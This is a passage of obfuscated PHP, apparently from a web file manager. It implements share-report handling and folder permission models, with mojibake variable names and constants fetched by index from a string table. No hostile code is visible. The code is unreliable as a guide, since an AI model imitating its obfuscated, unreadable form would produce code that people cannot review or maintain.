Èê[96]][$ÛØ™ Èê[43]] != $ÛØ™ Èê[209]) { $˛˜¢…’è = $this->_folderReport($÷√ΩÂí¯); if (!$˛˜¢…’è) { return; } show_json(LNG($ÛØ™ Èê[1992]) . $ÛØ™ Èê[1993] . $˛˜¢…’è, !1); } $ïèÙ°†ı = Model($ÛØ™ Èê[832])->fileInfoGet($»˚˙¿£ß[$ÛØ™ Èê[96]][$ÛØ™ Èê[411]]); if (!$ïèÙ°†ı) { return; } $ÿË˝À¥˚ = $this->shareFileMeta($ïèÙ°†ı[$ÛØ™ Èê[477]]); if (isset($ÿË˝À¥˚[$ÛØ™ Èê[383]]) && $ÿË˝À¥˚[$ÛØ™ Èê[383]] == $ÛØ™ Èê[98]) { show_json(LNG($ÛØ™ Èê[1994]), !1); } } private function _folderReport($∂ÅƒûÛ) { $ÒäÅÀÚ≠ =& $_SERVER[Á≈ ä ∞]; $‡•ú∞äç = array($ÒäÅÀÚ≠[477] => array($ÒäÅÀÚ≠[1015], 0), $ÒäÅÀÚ≠[757] => 3); $Ü’“Ü§∑ = Model($ÒäÅÀÚ≠[1995])->where($‡•ú∞äç)->field($ÒäÅÀÚ≠[477])->select(); if (!$Ü’“Ü§∑) { return !1; } $Ü’“Ü§∑ = array_to_keyvalue($Ü’“Ü§∑, $ÒäÅÀÚ≠[22], $ÒäÅÀÚ≠[477]); $ò„»¨Ä» = $ÒäÅÀÚ≠[60] . $∂ÅƒûÛ . $ÒäÅÀÚ≠[60]; $‡•ú∞äç = array($ÒäÅÀÚ≠[477] => array($ÒäÅÀÚ≠[17], $Ü’“Ü§∑), $ÒäÅÀÚ≠[530] => array($ÒäÅÀÚ≠[392], "\x25{$ò„»¨Ä»}\45"), $ÒäÅÀÚ≠[440] => 0); $Ô…˙èü© = Model($ÒäÅÀÚ≠[832])->where($‡•ú∞äç)->field($ÒäÅÀÚ≠[1996])->find(); if (!$Ô…˙èü©) { return !1; } $˝ë¶‚Å = substr($Ô…˙èü©[$ÒäÅÀÚ≠[530]], strpos($Ô…˙èü©[$ÒäÅÀÚ≠[530]], $ò„»¨Ä»)); $‡•ú∞äç = array($ÒäÅÀÚ≠[411] => array($ÒäÅÀÚ≠[17], trim($˝ë¶‚Å, $ÒäÅÀÚ≠[60]))); $ÓÚæáÕÒ = Model($ÒäÅÀÚ≠[832])->where($‡•ú∞äç)->field($ÒäÅÀÚ≠[42])->select(); $‹·é¥Ì± = array_to_keyvalue($ÓÚæáÕÒ, $ÒäÅÀÚ≠[22], $ÒäÅÀÚ≠[42]); $‹·é¥Ì±[] = $Ô…˙èü©[$ÒäÅÀÚ≠[42]]; return implode($ÒäÅÀÚ≠[18], $‹·é¥Ì±); } protected function remove($êÄ¡¨íç) { $ø¨¿Íë¸ =& $_SERVER[Á≈ ä ∞]; if (is_array($êÄ¡¨íç)) { $êÄ¡¨íç = array($ø¨¿Íë¸[17], $êÄ¡¨íç); } $∏Òó∫†á = array($ø¨¿Íë¸[498] => $êÄ¡¨íç); $´÷ùΩ‘£ = $this->where($∏Òó∫†á)->delete(); if ($´÷ùΩ‘£) { Model($ø¨¿Íë¸[611])->where(array($ø¨¿Íë¸[498] => $êÄ¡¨íç))->delete(); } $ëùÈ∞à≥ = is_array($êÄ¡¨íç) ? $êÄ¡¨íç[1] : array($êÄ¡¨íç); for ($ßÓè¯ì” = 0; $ßÓè¯ì” < count($ëùÈ∞à≥); $ßÓè¯ì”++) { $˙“Ñì©‹ = $this->getInfo($ëùÈ∞à≥[$ßÓè¯ì”]); if ($˙“Ñì©‹[$ø¨¿Íë¸[505]] == $ø¨¿Íë¸[98]) { Model($ø¨¿Íë¸[579])->eventShare($˙“Ñì©‹[$ø¨¿Íë¸[411]], $ø¨¿Íë¸[1985]); } if ($˙“Ñì©‹[$ø¨¿Íë¸[503]] == $ø¨¿Íë¸[98]) { Model($ø¨¿Íë¸[579])->eventShare($˙“Ñì©‹[$ø¨¿Íë¸[411]], $ø¨¿Íë¸[1984]); } } return $´÷ùΩ‘£; } protected function removeBySource($·œú„Ûï) { $∑°ÂÚ±‹ =& $_SERVER[Á≈ ä ∞]; $ÙÛÂÙ⁄ƒ = array($∑°ÂÚ±‹[426] => array($∑°ÂÚ±‹[427], $·œú„Ûï)); $Ô’È§Ôù = $this->field($∑°ÂÚ±‹[498])->where($ÙÛÂÙ⁄ƒ)->select(); $Ô’È§Ôù = array_to_keyvalue($Ô’È§Ôù, $∑°ÂÚ±‹[22], $∑°ÂÚ±‹[498]); if (!$Ô’È§Ôù) { return; } $ÙÛÂÙ⁄ƒ = array($∑°ÂÚ±‹[497] => array($∑°ÂÚ±‹[427], $Ô’È§Ôù)); $this->where($ÙÛÂÙ⁄ƒ)->delete(); Model($∑°ÂÚ±‹[611])->where($ÙÛÂÙ⁄ƒ)->delete(); } public function listAll($Œå‹«åà) { $»¶€ŸΩä =& $_SERVER[Á≈ ä ∞]; $Âæ§‡§‡ = array(); if ($Œå‹«åà[$»¶€ŸΩä[1658]]) { $Âæ§‡§‡[$»¶€ŸΩä[1658]] = $Œå‹«åà[$»¶€ŸΩä[1658]]; } if ($Œå‹«åà[$»¶€ŸΩä[768]]) { $∞Îﬁ¿•Ò = $Œå‹«åà[$»¶€ŸΩä[506]] ? $Œå‹«åà[$»¶€ŸΩä[506]] : strtotime(date($»¶€ŸΩä[1997])); $Âæ§‡§‡[$»¶€ŸΩä[210]] = array($»¶€ŸΩä[342], array($Œå‹«åà[$»¶€ŸΩä[768]], $∞Îﬁ¿•Ò)); } if ($Œå‹«åà[$»¶€ŸΩä[43]]) { $Âæ§‡§‡[$Œå‹«åà[$»¶€ŸΩä[43]]] = 1; } else { $Âæ§‡§‡[] = array($»¶€ŸΩä[503] => array($»¶€ŸΩä[1015], 0), $»¶€ŸΩä[505] => array($»¶€ŸΩä[1015], 0), $»¶€ŸΩä[1974] => $»¶€ŸΩä[1928]); } if ($Œå‹«åà[$»¶€ŸΩä[1924]]) { $Âæ§‡§‡[] = array($»¶€ŸΩä[500] => $Œå‹«åà[$»¶€ŸΩä[1924]], $»¶€ŸΩä[1557] => array($»¶€ŸΩä[392], "\x25{$Œå‹«åà[$»¶€ŸΩä[1924]]}\45"), $»¶€ŸΩä[1974] => $»¶€ŸΩä[1928]); } $ôı¡ää• = $this->_makeOrder()->where($Âæ§‡§‡)->selectPage(20); if (empty($ôı¡ää•[$»¶€ŸΩä[378]])) { return array(); } $this->_listDataApply($ôı¡ää•[$»¶€ŸΩä[378]]); return $ôı¡ää•; } public function listDataApply($û”¸œ˜Ø) { $this->_listDataApply($û”¸œ˜Ø); return $û”¸œ˜Ø; } private function _listDataApply(&$ßˆÄ¡†÷) { $©óø¢êÿ =& $_SERVER[Á≈ ä ∞]; $´é∑˙Œ¥ = array_to_keyvalue($ßˆÄ¡†÷, $©óø¢êÿ[22], $©óø¢êÿ[1658]); $ÎŸÁ⁄ûœ = Model($©óø¢êÿ[544])->userListInfo(array_unique($´é∑˙Œ¥)); $°–ûÔú∆ = array_to_keyvalue($ßˆÄ¡†÷, $©óø¢êÿ[22], $©óø¢êÿ[411]); $ìØõÖ†ë = Model($©óø¢êÿ[832])->sourceListInfo($°–ûÔú∆, !0); foreach ($ßˆÄ¡†÷ as $¥¥Ò÷πµ => &$ıÔ≈áŸ∑) { $Ñ„ÃíÃ– = $ıÔ≈áŸ∑[$©óø¢êÿ[1658]]; $ıÔ≈áŸ∑[$©óø¢êÿ[1998]] = $ÎŸÁ⁄ûœ[$Ñ„ÃíÃ–] ? $ÎŸÁ⁄ûœ[$Ñ„ÃíÃ–] : !1; $¥™˛¬œ¬ = $ıÔ≈áŸ∑[$©óø¢êÿ[411]]; $ıÔ≈áŸ∑[$©óø¢êÿ[96]] = $ìØõÖ†ë[$¥™˛¬œ¬] ? $ìØõÖ†ë[$¥™˛¬œ¬] : !1; if ($ıÔ≈áŸ∑[$©óø¢êÿ[96]][$©óø¢êÿ[440]] == $©óø¢êÿ[98]) { unset($ßˆÄ¡†÷[$¥¥Ò÷πµ]); } if ($ıÔ≈áŸ∑[$©óø¢êÿ[96]] != $©óø¢êÿ[207] && !$ıÔ≈áŸ∑[$©óø¢êÿ[96]]) { unset($ßˆÄ¡†÷[$¥¥Ò÷πµ]); } } unset($ıÔ≈áŸ∑); $ßˆÄ¡†÷ = array_values($ßˆÄ¡†÷); } private function _makeOrder($≤Â’ç…Ì = '') { $ÓÎâ∫ú∑ =& $_SERVER[Á≈ ä ∞]; $¡¥∆ëè◊ = array($ÓÎâ∫ú∑[210], $ÓÎâ∫ú∑[506], $ÓÎâ∫ú∑[1987], $ÓÎâ∫ú∑[1988]); $˘òΩ©«Ÿ = array($ÓÎâ∫ú∑[459] => $ÓÎâ∫ú∑[460], $ÓÎâ∫ú∑[461] => $ÓÎâ∫ú∑[462]); $ÆéßıÅ≈ = Input::get($ÓÎâ∫ú∑[466], $ÓÎâ∫ú∑[17], $ÓÎâ∫ú∑[432], $¡¥∆ëè◊); $—Ôï—Íâ = Input::get($ÓÎâ∫ú∑[467], $ÓÎâ∫ú∑[17], $ÓÎâ∫ú∑[1999], array($ÓÎâ∫ú∑[1921], $ÓÎâ∫ú∑[461])); $—Ôï—Íâ = $˘òΩ©«Ÿ[$—Ôï—Íâ]; $≤Â’ç…Ì = $≤Â’ç…Ì . "{$ÆéßıÅ≈}\40{$—Ôï—Íâ}"; return $this->order($≤Â’ç…Ì); } public function reportAdd($í÷Èé√‚) { $ﬁ±ì…¿⁄ =& $_SERVER[Á≈ ä ∞]; $ÛÛÈÎó– = array($ﬁ±ì…¿⁄[498] => $í÷Èé√‚[$ﬁ±ì…¿⁄[498]], $ﬁ±ì…¿⁄[1658] => USER_ID); if (Model($ﬁ±ì…¿⁄[1995])->where($ÛÛÈÎó–)->find()) { return !1; } $ÕÓæŒıﬁ = array($ﬁ±ì…¿⁄[498] => $í÷Èé√‚[$ﬁ±ì…¿⁄[498]], $ﬁ±ì…¿⁄[1557] => $í÷Èé√‚[$ﬁ±ì…¿⁄[1557]], $ﬁ±ì…¿⁄[411] => $í÷Èé√‚[$ﬁ±ì…¿⁄[411]], $ﬁ±ì…¿⁄[477] => $í÷Èé√‚[$ﬁ±ì…¿⁄[477]], $ﬁ±ì…¿⁄[1658] => USER_ID, $ﬁ±ì…¿⁄[43] => $í÷Èé√‚[$ﬁ±ì…¿⁄[43]], $ﬁ±ì…¿⁄[462] => $í÷Èé√‚[$ﬁ±ì…¿⁄[462]]); return Model($ﬁ±ì…¿⁄[1995])->add($ÕÓæŒıﬁ); } public function reportList($ÕÇåÚÉÖ) { $æüﬂü£ä =& $_SERVER[Á≈ ä ∞]; $§€¬õÃõ = array(); if ($ÕÇåÚÉÖ[$æüﬂü£ä[768]]) { $˛—ãÁ¨° = $ÕÇåÚÉÖ[$æüﬂü£ä[506]] ? $ÕÇåÚÉÖ[$æüﬂü£ä[506]] : strtotime(date($æüﬂü£ä[1997])); $§€¬õÃõ[$æüﬂü£ä[210]] = array($æüﬂü£ä[342], array($ÕÇåÚÉÖ[$æüﬂü£ä[768]], $˛—ãÁ¨°)); } if (isset($ÕÇåÚÉÖ[$æüﬂü£ä[43]]) && in_array($ÕÇåÚÉÖ[$æüﬂü£ä[43]], array($æüﬂü£ä[98], $æüﬂü£ä[446], $æüﬂü£ä[2000], $æüﬂü£ä[2001], $æüﬂü£ä[2002]))) { $§€¬õÃõ[$æüﬂü£ä[43]] = $ÕÇåÚÉÖ[$æüﬂü£ä[43]]; } if (isset($ÕÇåÚÉÖ[$æüﬂü£ä[757]]) && in_array($ÕÇåÚÉÖ[$æüﬂü£ä[757]], array($æüﬂü£ä[207], $æüﬂü£ä[98], $æüﬂü£ä[446], $æüﬂü£ä[2000]))) { $§€¬õÃõ[$æüﬂü£ä[757]] = $ÕÇåÚÉÖ[$æüﬂü£ä[757]]; } $à˘ éœ≥ = Input::get($æüﬂü£ä[467], $æüﬂü£ä[17], $æüﬂü£ä[1999], array($æüﬂü£ä[1921], $æüﬂü£ä[461])); $˝Ì∫îÆì = array($æüﬂü£ä[459] => $æüﬂü£ä[460], $æüﬂü£ä[461] => $æüﬂü£ä[462]); $»˛Ùé‚Î = $æüﬂü£ä[2003] . $˝Ì∫îÆì[$à˘ éœ≥]; $†Âóê±∏ = Model($æüﬂü£ä[1995])->where($§€¬õÃõ)->order($»˛Ùé‚Î)->selectPage(20); if (empty($†Âóê±∏[$æüﬂü£ä[378]])) { return array(); } $æœìç¡€ = array_to_keyvalue_group($†Âóê±∏[$æüﬂü£ä[378]], $æüﬂü£ä[757], $æüﬂü£ä[498]); if (!empty($æœìç¡€[0])) { $ÕÇåÚÉÖ = $æœìç¡€[0]; $§€¬õÃõ = array($æüﬂü£ä[498] => array($æüﬂü£ä[17], $ÕÇåÚÉÖ)); $°ÆÖäﬂ‰ = $this->where($§€¬õÃõ)->field($æüﬂü£ä[498])->select(); $°ÆÖäﬂ‰ = array_to_keyvalue($°ÆÖäﬂ‰, $æüﬂü£ä[22], $æüﬂü£ä[498]); $≠π°®˙¿ = array_diff($ÕÇåÚÉÖ, $°ÆÖäﬂ‰); if (!empty($≠π°®˙¿)) { foreach ($†Âóê±∏[$æüﬂü£ä[378]] as $˙íæ‚£æ => $Á®∆®”Î) { if (in_array($Á®∆®”Î[$æüﬂü£ä[498]], $≠π°®˙¿)) { unset($†Âóê±∏[$æüﬂü£ä[378]][$˙íæ‚£æ]); } } } } $this->_listDataApply($†Âóê±∏[$æüﬂü£ä[378]]); return $†Âóê±∏; } public function reportStatus($‰∂óÙ˜¸) { $ñ«Ñ˜çÜ =& $_SERVER[Á≈ ä ∞]; $˙Ë˛◊ ® = array($ñ«Ñ˜çÜ[408] => $‰∂óÙ˜¸[$ñ«Ñ˜çÜ[408]]); $ÏÜÒ¶Ì£ = Model($ñ«Ñ˜çÜ[1995])->where($˙Ë˛◊ ®)->field($ñ«Ñ˜çÜ[2004])->find(); if (!$ÏÜÒ¶Ì£) { return !1; } $Ú˝ùïµØ = array($ñ«Ñ˜çÜ[757] => $‰∂óÙ˜¸[$ñ«Ñ˜çÜ[757]]); if ($‰∂óÙ˜¸[$ñ«Ñ˜çÜ[757]] == $ñ«Ñ˜çÜ[2000] && $ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[757]] == $ñ«Ñ˜çÜ[2000]) { $Ú˝ùïµØ[$ñ«Ñ˜çÜ[757]] = 0; } $¿∂»Â¯Õ = Model($ñ«Ñ˜çÜ[1995])->where($˙Ë˛◊ ®)->save($Ú˝ùïµØ); if ($‰∂óÙ˜¸[$ñ«Ñ˜çÜ[757]] == $ñ«Ñ˜çÜ[446]) { if ($ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[477]] != $ñ«Ñ˜çÜ[207] && $this->shareFileMeta($ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[477]])) { $this->shareFileMeta($ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[477]], 0); } $this->remove($ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[498]]); return !0; } if ($¿∂»Â¯Õ && $‰∂óÙ˜¸[$ñ«Ñ˜çÜ[757]] == $ñ«Ñ˜çÜ[2000]) { $πÍ‰≤Æ£ = $Ú˝ùïµØ[$ñ«Ñ˜çÜ[757]] == $ñ«Ñ˜çÜ[2000] ? 1 : 0; $this->shareFileMeta($ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[477]], $πÍ‰≤Æ£); $this->removeByFile($ÏÜÒ¶Ì£[$ñ«Ñ˜çÜ[477]]); } return $¿∂»Â¯Õ; } private function removeByFile($¡Êƒ≠˛È) { $óŸπÛÚ‚ =& $_SERVER[Á≈ ä ∞]; $∂âÔ¡Ï¸ = Model($óŸπÛÚ‚[832])->where(array($óŸπÛÚ‚[477] => $¡Êƒ≠˛È))->field($óŸπÛÚ‚[411])->select(); $‚˘ÏÒ˚ı = array_to_keyvalue($∂âÔ¡Ï¸, $óŸπÛÚ‚[22], $óŸπÛÚ‚[411]); $ôñèâ—Â = array($óŸπÛÚ‚[411] => array($óŸπÛÚ‚[17], $‚˘ÏÒ˚ı), $óŸπÛÚ‚[503] => 1); $∂âÔ¡Ï¸ = $this->where($ôñèâ—Â)->field($óŸπÛÚ‚[498])->select(); if (empty($∂âÔ¡Ï¸)) { return; } $ÕãÊùãÅ = array_to_keyvalue($∂âÔ¡Ï¸, $óŸπÛÚ‚[22], $óŸπÛÚ‚[498]); $this->remove($ÕãÊùãÅ); } private function shareFileMeta($ÓÜ≤ﬂŒß, $Ö¡üâ≈∂ = null) { $–Î◊∂ªÒ =& $_SERVER[Á≈ ä ∞]; $˘˛˚≥“ò = array($–Î◊∂ªÒ[477] => $ÓÜ≤ﬂŒß, $–Î◊∂ªÒ[104] => $–Î◊∂ªÒ[2005]); if (is_null($Ö¡üâ≈∂)) { return Model($–Î◊∂ªÒ[2006])->where($˘˛˚≥“ò)->find(); } $˘˛˚≥“ò[$–Î◊∂ªÒ[383]] = $Ö¡üâ≈∂; Model($–Î◊∂ªÒ[2006])->add($˘˛˚≥“ò, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\145\x5f\x61\x75\x74\x68"; public function getAuth($‚›Õ“ÉÕ) { $†»¨®˚ß =& $_SERVER[Á≈ ä ∞]; $ÍµÓÌÕ§ = $this->sourceAuthSelect($‚›Õ“ÉÕ); $ÃΩöÑèõ = array(); $¿∑Œ¿ˆ• = array(); $©˙•åœ” = 2 << 25; foreach ($ÍµÓÌÕ§ as $÷Ÿæî†´) { $¿áêË√® = Model($†»¨®˚ß[516])->listData($÷Ÿæî†´[$†»¨®˚ß[1934]]); if (!$¿áêË√®) { continue; } $ÃΩöÑèõ[] = $÷Ÿæî†´; $»ã´ú∞– = 0; if ($÷Ÿæî†´[$†»¨®˚ß[420]] == SourceModel::TYPE_GROUP) { $»ã´ú∞– = $©˙•åœ” * 2; } if ($÷Ÿæî†´[$†»¨®˚ß[420]] == SourceModel::TYPE_USER) { $»ã´ú∞– = $©˙•åœ”; } if ($÷Ÿæî†´[$†»¨®˚ß[420]] == SourceModel::TYPE_USER && $÷Ÿæî†´[$†»¨®˚ß[514]] == $†»¨®˚ß[207]) { $»ã´ú∞– = 0; } $¿∑Œ¿ˆ•[] = $¿áêË√®[$†»¨®˚ß[422]] + $»ã´ú∞–; } array_multisort($¿∑Œ¿ˆ•, SORT_DESC, $ÃΩöÑèõ); return $ÃΩöÑèõ; } public function sourceAuthSelect($ÖÉó¯≥£) { $˙œÓ◊‘à =& $_SERVER[Á≈ ä ∞]; static $≠û’˛¢÷ = array(); $áò⁄˛ı˝ = is_array($ÖÉó¯≥£) ? !1 : !0; if ($áò⁄˛ı˝) { $ÖÉó¯≥£ = array($ÖÉó¯≥£); } $£Òˆ’ó« = array(); foreach ($ÖÉó¯≥£ as $ΩÊƒƒÕŸ) { if (isset($≠û’˛¢÷[$ΩÊƒƒÕŸ])) { $£Òˆ’ó«[$ΩÊƒƒÕŸ] = $≠û’˛¢÷[$ΩÊƒƒÕŸ]; } } if (count($£Òˆ’ó«) == count($ÖÉó¯≥£)) { return $áò⁄˛ı˝ ? $£Òˆ’ó«[$ÖÉó¯≥£[0]] : $£Òˆ’ó«; } $íœ÷¿…ß = $˙œÓ◊‘à[2007]; $â”€ñº∆ = array($˙œÓ◊‘à[411] => array($˙œÓ◊‘à[17], $ÖÉó¯≥£)); $‘√Âçﬁì = $this->field($íœ÷¿…ß)->order($˙œÓ◊‘à[408])->where($â”€ñº∆)->select(); $ÿ˜¨œ‰± = array_to_keyvalue_group($‘√Âçﬁì, $˙œÓ◊‘à[411]); foreach ($ÖÉó¯≥£ as $ΩÊƒƒÕŸ) { $≠û’˛¢÷[$ΩÊƒƒÕŸ] = $ÿ˜¨œ‰±[$ΩÊƒƒÕŸ] ? $ÿ˜¨œ‰±[$ΩÊƒƒÕŸ] : array(); } if ($áò⁄˛ı˝) { return $‘√Âçﬁì; } return $ÿ˜¨œ‰±; } public function setAuth($™÷ä»ÿ≈, $áó’ﬁß”) { $◊ˆ—©ïú =& $_SERVER[Á≈ ä ∞]; $¯˛úƒ¿Ø = Model($◊ˆ—©ïú[1330])->sourceInfo($™÷ä»ÿ≈); if (!$¯˛úƒ¿Ø) { return !1; } if ($¯˛úƒ¿Ø[$◊ˆ—©ïú[420]] != SourceModel::TYPE_GROUP) { return !1; } $ÑªÔÃ“√ = 1; $‰⁄ù©ù¥ = $¯˛úƒ¿Ø[$◊ˆ—©ïú[514]]; if ($‰⁄ù©ù¥ != $ÑªÔÃ“√) { $‡Ëí—¡œ = array($◊ˆ—©ïú[1830] => $‰⁄ù©ù¥); $◊—¯©Ö≥ = Model($◊ˆ—©ïú[1920])->field($◊ˆ—©ïú[1658])->where($‡Ëí—¡œ)->select(); $◊—¯©Ö≥ = array_to_keyvalue($◊—¯©Ö≥, $◊ˆ—©ïú[22], $◊ˆ—©ïú[1658]); } $≤¸Ç≥ãÔ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Í‰ıµÃ® = array(); foreach ($áó’ﬁß” as $ºÚù≤œπ) { if (!in_array($ºÚù≤œπ[$◊ˆ—©ïú[420]], $≤¸Ç≥ãÔ)) { show_json(LNG($◊ˆ—©ïú[2008]), !1); } if ($‰⁄ù©ù¥ != $ÑªÔÃ“√) { if ($ºÚù≤œπ[$◊ˆ—©ïú[420]] == SourceModel::TYPE_GROUP) { } if ($ºÚù≤œπ[$◊ˆ—©ïú[514]] != 0 && !in_array($ºÚù≤œπ[$◊ˆ—©ïú[514]], $◊—¯©Ö≥)) { } } if ($ºÚù≤œπ[$◊ˆ—©ïú[514]] == 0) { $ºÚù≤œπ[$◊ˆ—©ïú[420]] = SourceModel::TYPE_USER; } $Í‰ıµÃ®[] = array($◊ˆ—©ïú[411] => $™÷ä»ÿ≈, $◊ˆ—©ïú[420] => intval($ºÚù≤œπ[$◊ˆ—©ïú[420]]), $◊ˆ—©ïú[514] => intval($ºÚù≤œπ[$◊ˆ—©ïú[514]]), $◊ˆ—©ïú[1934] => intval($ºÚù≤œπ[$◊ˆ—©ïú[1934]]) ? intval($ºÚù≤œπ[$◊ˆ—©ïú[1934]]) : 0, $◊ˆ—©ïú[1990] => intval($ºÚù≤œπ[$◊ˆ—©ïú[1990]]) ? intval($ºÚù≤œπ[$◊ˆ—©ïú[1990]]) : -1); } $this->where(array($◊ˆ—©ïú[426] => $™÷ä»ÿ≈))->delete(); $this->addAll($Í‰ıµÃ®); return !0; } public function authClear($ù…∞Ú∞ò) { $ø¶ëö£€ =& $_SERVER[Á≈ ä ∞]; $ﬁ¨∑æ‹™ = Model($ø¶ëö£€[1330])->sourceInfo($ù…∞Ú∞ò); $≈°Ì•∂º = array($ù…∞Ú∞ò); if ($ﬁ¨∑æ‹™[$ø¶ëö£€[419]] == $ø¶ëö£€[98]) { $â›ÅÙü∞ = array($ø¶ëö£€[599] => array($ø¶ëö£€[559], $ﬁ¨∑æ‹™[$ø¶ëö£€[530]] . $ù…∞Ú∞ò . $ø¶ëö£€[560])); $≈°Ì•∂º = Model($ø¶ëö£€[1330])->field($ø¶ëö£€[426])->where($â›ÅÙü∞)->getField($ø¶ëö£€[411], !0); $≈°Ì•∂º[] = $ù…∞Ú∞ò; } $this->where(array($ø¶ëö£€[426] => array($ø¶ëö£€[427], $≈°Ì•∂º)))->delete(); return !0; } public function getAllChildren($∏œÿîø˝) { $¡≠˛¥ﬁﬁ =& $_SERVER[Á≈ ä ∞]; $¸°ÜπÛ’ = Model($¡≠˛¥ﬁﬁ[1330])->sourceInfo($∏œÿîø˝); if ($¸°ÜπÛ’[$¡≠˛¥ﬁﬁ[419]] != $¡≠˛¥ﬁﬁ[98]) { return $this->sourceListAuth(array($∏œÿîø˝)); } if ($¸°ÜπÛ’[$¡≠˛¥ﬁﬁ[420]] != SourceModel::TYPE_GROUP) { return array(); } $€Ë≈√†” = 1; $ŸàΩì‡ª = array($∏œÿîø˝); if ($¸°ÜπÛ’[$¡≠˛¥ﬁﬁ[441]] == $¡≠˛¥ﬁﬁ[207] && $¸°ÜπÛ’[$¡≠˛¥ﬁﬁ[514]] != $€Ë≈√†”) { $ŸàΩì‡ª = $this->groupChidldAllRootSource($¸°ÜπÛ’[$¡≠˛¥ﬁﬁ[514]]); } $Â∏∞ã¶Ô = $this->field($¡≠˛¥ﬁﬁ[411])->group($¡≠˛¥ﬁﬁ[411])->select(); $Â∏∞ã¶Ô = array_to_keyvalue($Â∏∞ã¶Ô, $¡≠˛¥ﬁﬁ[22], $¡≠˛¥ﬁﬁ[411]); if (!$Â∏∞ã¶Ô) { return array(); } $ÓëÔ¡÷¸ = $¡≠˛¥ﬁﬁ[2009]; $ôáæÅÒÎ = array($¡≠˛¥ﬁﬁ[411] => array($¡≠˛¥ﬁﬁ[17], $Â∏∞ã¶Ô), $¡≠˛¥ﬁﬁ[440] => $¡≠˛¥ﬁﬁ[207]); $§ùõ˚Èñ = Model($¡≠˛¥ﬁﬁ[832])->field($ÓëÔ¡÷¸)->where($ôáæÅÒÎ)->select(); $∑≤¶ïºó = array($∏œÿîø˝); foreach ($§ùõ˚Èñ as $«ﬁ’€ª—) { foreach ($ŸàΩì‡ª as $ì…ﬁÛ¸—) { $á·¥ﬂà« = $¡≠˛¥ﬁﬁ[60] . $ì…ﬁÛ¸— . $¡≠˛¥ﬁﬁ[60]; $è›öﬁ®œ = $«ﬁ’€ª—[$¡≠˛¥ﬁﬁ[530]] . $«ﬁ’€ª—[$¡≠˛¥ﬁﬁ[411]] . $¡≠˛¥ﬁﬁ[60]; if (strstr($è›öﬁ®œ, $á·¥ﬂà«)) { $∑≤¶ïºó[] = $«ﬁ’€ª—[$¡≠˛¥ﬁﬁ[411]]; break; } } } return $this->sourceListAuth($∑≤¶ïºó); } private function sourceListAuth($¬å´»˝£) { $·∞∂Ë°˛ =& $_SERVER[Á≈ ä ∞]; $¯ÈªÅ◊ª = Model($·∞∂Ë°˛[1330])->sourceListInfo($¬å´»˝£, !0); $®™ÇÒ¡ò = $this->sourceAuthSelect($¬å´»˝£); $ÑÎ∏ƒ∆¿ = array(); $µ˙Â¸Ω˝ = array(); foreach ($¯ÈªÅ◊ª as $≤‰°ú∏Œ) { unset($≤‰°ú∏Œ[$·∞∂Ë°˛[465]]); unset($≤‰°ú∏Œ[$·∞∂Ë°˛[463]]); unset($≤‰°ú∏Œ[$·∞∂Ë°˛[422]]); unset($≤‰°ú∏Œ[$·∞∂Ë°˛[96]]); $§‰û®˚î = $®™ÇÒ¡ò[$≤‰°ú∏Œ[$·∞∂Ë°˛[411]]]; if (!$§‰û®˚î) { continue; } $≤‰°ú∏Œ[$·∞∂Ë°˛[2010]] = $this->authTargetInfo($§‰û®˚î); $≤‰°ú∏Œ[$·∞∂Ë°˛[528]] = rtrim($≤‰°ú∏Œ[$·∞∂Ë°˛[534]], $·∞∂Ë°˛[18]) . $·∞∂Ë°˛[18] . ltrim($≤‰°ú∏Œ[$·∞∂Ë°˛[528]], $·∞∂Ë°˛[18]); $ÑÎ∏ƒ∆¿[] = $≤‰°ú∏Œ; $‡ˆï‹Ù€ = count(explode($·∞∂Ë°˛[18], trim($≤‰°ú∏Œ[$·∞∂Ë°˛[528]], $·∞∂Ë°˛[18]))); $µ˙Â¸Ω˝[] = $‡ˆï‹Ù€ + ($≤‰°ú∏Œ[$·∞∂Ë°˛[43]] == $·∞∂Ë°˛[85] ? 0 : 1000); } array_multisort($µ˙Â¸Ω˝, SORT_ASC, $ÑÎ∏ƒ∆¿); return $ÑÎ∏ƒ∆¿; } private function groupChidldAllRootSource($ñªÎâÓÌ) { $∏µ´⁄¸˜ =& $_SERVER[Á≈ ä ∞]; $ßçñˆ‹Ü = Model($∏µ´⁄¸˜[2011])->groupChildrenAll($ñªÎâÓÌ); $’Àü·ŸÃ = array($∏µ´⁄¸˜[441] => 0, $∏µ´⁄¸˜[514] => array($∏µ´⁄¸˜[17], $ßçñˆ‹Ü), $∏µ´⁄¸˜[420] => SourceModel::TYPE_GROUP); $ŸÏòØ÷≤ = Model($∏µ´⁄¸˜[832])->field($∏µ´⁄¸˜[411])->where($’Àü·ŸÃ)->select(); $ŸÏòØ÷≤ = array_to_keyvalue($ŸÏòØ÷≤, $∏µ´⁄¸˜[22], $∏µ´⁄¸˜[411]); return $ŸÏòØ÷≤; } private function authTargetInfo($¿ﬂπÉ—«) { $Å⁄ãåßé =& $_SERVER[Á≈ ä ∞]; $øúÊﬂÖ¿ = array(); $ﬂπÊßë∞ = array(); $ÒŸåÄØﬁ = 2 << 25; foreach ($¿ﬂπÉ—« as $óÑ°ãçç) { $Æ‘‹Ü∂Ã = Model($Å⁄ãåßé[516])->listData($óÑ°ãçç[$Å⁄ãåßé[1934]]); if (!$Æ‘‹Ü∂Ã) { continue; } if ($óÑ°ãçç[$Å⁄ãåßé[420]] == SourceModel::TYPE_USER) { $«À≥≥ç‡ = Model($Å⁄ãåßé[522])->getInfoSimpleOuter($óÑ°ãçç[$Å⁄ãåßé[514]]); if ($«À≥≥ç‡[$Å⁄ãåßé[1658]] == $Å⁄ãåßé[1193]) { continue; } if ($«À≥≥ç‡[$Å⁄ãåßé[1658]] == $Å⁄ãåßé[207]) { $«À≥≥ç‡[$Å⁄ãåßé[42]] = LNG($Å⁄ãåßé[2012]); } } else { $«À≥≥ç‡ = Model($Å⁄ãåßé[531])->getInfoSimple($óÑ°ãçç[$Å⁄ãåßé[514]]); } if (!$«À≥≥ç‡) { continue; } $«À≥≥ç‡[$Å⁄ãåßé[476]] = $Æ‘‹Ü∂Ã; $øúÊﬂÖ¿[] = $«À≥≥ç‡; 